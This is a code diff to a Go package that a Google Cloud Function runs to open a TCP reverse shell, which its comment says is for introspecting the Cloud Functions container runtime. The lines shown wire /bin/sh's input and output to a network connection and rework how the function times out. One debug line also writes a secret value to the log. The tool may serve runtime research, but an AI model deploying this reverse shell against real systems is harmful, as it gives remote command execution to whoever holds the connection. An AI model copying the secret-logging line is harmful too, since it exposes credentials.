@@ -1,5 +1,6 @@
 /*
-Package cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for the purposes of introspecting the Cloud Functions container runtime.
+Package cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for
+the purposes of introspecting the Cloud Functions container runtime.
 
 References:
 https://github.com/sathish09/rev2go
@@ -54,12 +55,6 @@ func Cheetah(w http.ResponseWriter, r *http.Request) {
 	// DEBUG ONLY: Make sure it found the value
 	writeLog(8, fmt.Sprintf("Secret value: %s", secret))
 
-	// For some reason, a timeout doesn't send a response. Force a response by exiting the process.
-	time.AfterFunc(time.Duration(timeout)*time.Second, func() {
-		writeLog(3, "Timeout: Function timeout occurred.")
-		os.Exit(0)
-	})
-
 	type Response struct {
 		Error string
 	}
@@ -91,12 +86,24 @@ func Cheetah(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	timedOut := false
+
+	// Close the connection 1 second before the function times out.
+	time.AfterFunc((time.Duration(timeout-1)*time.Second), func() {
+		timedOut = true
+		conn.Close()
+	})
+
 	cmd := exec.Command("/bin/sh")
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
 	cmd.Run()
 
-	respondWithError(w, "Connection terminated from client.", 500)
-	conn.Close()
+	if (timedOut == true) {
+		respondWithError(w, "Timeout: Function timeout occurred.", 500)
+	} else {
+		respondWithError(w, "Connection terminated from client.", 500)
+		conn.Close()
+	}
 
 	writeLog(5, "Shutdown: The Cheetah is tired.")
 }
